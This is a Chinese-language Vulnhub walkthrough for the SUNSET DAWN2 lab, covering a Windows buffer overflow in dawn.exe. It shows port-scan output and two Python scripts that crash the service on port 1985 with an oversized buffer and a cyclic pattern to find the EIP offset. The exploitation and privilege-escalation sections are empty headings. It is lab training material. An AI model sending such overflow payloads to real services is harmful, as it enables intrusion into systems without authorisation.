---
layer: article
title: Vulnhub 424 SUNSET DAWN2
tags: pentest vulnhub Walkthrough
---

考点：windows缓冲区溢出

靶机链接：<https://www.vulnhub.com/entry/sunset-dawn2,424/>

## 环境配置

| 名称                            | IP        |
| ------------------------------- | --------- |
| Kali Linux                      | 10.0.2.15 |
| SUNSET DAWN2                    | 10.0.2.7  |
| Windows 调试机（Windows 7 X86） | 10.0.2.14 |



## 初步打点

### 端口扫描

```bash
$ export rip=10.0.2.7
$ sudo nmap -v -A -p- $rip
Scanning localhost (10.0.2.7) [65535 ports]
Discovered open port 80/tcp on 10.0.2.7
Discovered open port 1985/tcp on 10.0.2.7
Discovered open port 1435/tcp on 10.0.2.7
PORT     STATE SERVICE   VERSION
80/tcp   open  http      Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
1435/tcp open  ibm-cics?
1985/tcp open  hsrp?
2 services unrecognized despite returning data.
```

![1](F:\Users\ms\Desktop\424\1.PNG)

80端口发现可以下载个压缩包dawn.zip，解压发现dawn.exe

1435端口和10985端口通过nc连接后，均无回显，猜测是dawn.exe运行在这两个端口之一。

这个靶机应该是考windows缓冲区溢出的。而且，这个dawn.exe大概率是linux环境通过wine运行的。

### 漏洞发现

把dawn.exe复制到windows调试机，运行后，发现可输入一些字符。

```cmd
C:\Users\John>tasklist|findstr dawn
dawn.exe                      2800 Console                    1      2,232 K
C:\Users\John>netstat -ano|findstr 2800
  TCP    0.0.0.0:1985           0.0.0.0:0              LISTENING       2800
```

由此判定靶机1985端口运行的大概率是dawn.exe

使用脚本进行调试

```python
#!/usr/bin/python2
import socket
import sys
import os
ip = "10.0.2.14"
port = 1985
buff = "A" * 300
nullByte = "\x00"
inputBuffer = buff + nullByte
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.send(inputBuffer)
s.close()
```

![2](F:\Users\ms\Desktop\424\2.PNG)

运行后，dawn.exe 停止工作，说明存在缓冲区溢出漏洞。

## 获得权限

### 本地测试

继续测试

使用Immunity Debugger 打开dawn.exe并运行

使用msf-pattern_create生成字符串

```bash
$ msf-pattern_create -l 300   
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
```

确定位置

```python
#!/usr/bin/python2
import socket
import sys
import os
ip = "10.0.2.14"
port = 1985
buff = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"
nullByte = "\x00"
inputBuffer = buff + nullByte
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.send(inputBuffer)
```

![3](F:\Users\ms\Desktop\424\3.PNG)

运行后看到进程暂停，EIP为`316A4130`

### 靶机测试

## 提权
